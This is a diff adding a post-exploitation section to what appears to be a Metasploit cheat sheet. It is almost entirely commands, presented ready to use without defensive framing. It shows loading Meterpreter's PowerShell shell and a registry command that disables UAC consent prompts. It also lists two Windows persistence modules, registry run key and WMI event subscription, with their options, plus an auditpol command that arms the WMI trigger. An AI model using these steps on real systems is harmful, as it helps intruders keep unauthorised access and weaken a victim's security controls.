@@ -145,3 +145,33 @@ set SESSION X
 SHOWDESCRIPTION true
 -----------------------------------------------------------------------
 ````
+## Powershell Extension 
+````
+meterpreter > load powershell
+Loading extension powershell...Success.
+meterpreter > powershell_shell
+PS > 
+````
+### Change UAC to not Notify
+````
+Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
+````
+## Persistance Modules 
+- Registry Run Key 
+````
+use exploit/windows/registry/local/registry_persistence
+````
+- Ensure to set the `RUN_NAME` at a minimum 
+- WMI Event Subscription Persistance 
+````
+use exploit/windows/local/wmi_persistence
+````
+- Ensure failed login auditing is enabled on target 
+- To enable:
+````
+auditpol.exe /set /subcategory:Logon /failure:Enable
+`````
+- Event ID for a failed logon is `4625`
+- Ensure to set the `USERNAME_TRIGGER` and `SESSION` at a minimum 
+- Cannot be run as SYSTEM or USER needs to be run with ADMINISTRATOR
+
